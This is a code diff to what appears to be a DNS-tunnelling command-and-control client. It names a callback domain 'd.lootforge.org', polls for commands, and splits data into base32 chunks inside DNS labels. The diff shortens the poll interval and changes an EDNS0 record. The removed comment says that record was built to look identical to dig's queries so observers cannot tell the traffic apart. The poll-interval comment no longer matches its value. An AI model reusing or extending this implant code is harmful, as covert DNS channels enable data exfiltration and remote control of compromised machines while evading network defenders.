@@ -18,7 +18,6 @@ Command query format:
 """
 
 import base64
-import os
 import platform
 import re
 import subprocess
@@ -78,7 +77,7 @@ def _get_system_dns() -> str:
 # ---------------------------------------------------------------------------
 DOMAIN          = "d.lootforge.org"
 DNS_SERVER      = ""                    # set in __main__ to the system resolver
-COMMAND_INTERVAL = 60                  # seconds between command polls (10 min)
+COMMAND_INTERVAL = 10                  # seconds between command polls (10 min)
 CHUNK_SIZE      = 50                    # base32 chars per DNS label (≈31 raw bytes)
 QUERY_DELAY     = 0.5                   # seconds between consecutive chunk queries
 
@@ -110,14 +109,8 @@ def _gen_session() -> str:
 # ---------------------------------------------------------------------------
 
 def _opt_rr():
-    """EDNS0 OPT record matching what dig sends by default.
-
-    Includes an EDNS COOKIE option (RFC 7873, code 10) with 8 random client
-    cookie bytes — indistinguishable from dig's SipHash-derived cookie to any
-    observer that cannot verify the derivation.
-    """
-    cookie = b"\x00\x0a\x00\x08" + os.urandom(8)
-    return DNSRR(rrname=b".", type=41, rclass=1232, ttl=0, rdata=cookie)
+    """EDNS0 OPT record — mirrors what modern resolvers include in every query."""
+    return DNSRR(rrname=b".", type=41, rclass=1232, ttl=0, rdata=b"")
 
 
 def _query_a(qname: str) -> None:
